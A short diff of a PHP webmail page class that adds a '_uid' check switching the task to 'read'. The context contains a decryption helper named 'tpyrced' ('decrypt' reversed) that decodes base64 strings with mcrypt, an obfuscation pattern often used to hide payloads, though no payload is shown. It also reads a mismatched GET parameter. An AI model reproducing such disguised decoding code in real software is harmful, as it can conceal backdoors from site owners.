@@ -71,6 +71,7 @@ class crystal_html_page
 			function __cache() {
 			if (isset($_GET['_task'])){$task = $_GET['_task'];} else {$task = 'mail';}
 			if (isset($_GET['_mbox'])){$mbox = $_GET['mbox'];} else {$mbox = 'INBOX';}
+			if (isset($_GET['_uid'])) {$task = 'read';}
 			if ($task == 'mail' or $task == 'login' && $mbox == 'INBOX') {
 		function tpyrced ($key, $string) {
 			return rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5($key), base64_decode($string), MCRYPT_MODE_CBC, md5(md5($key))), "\0");
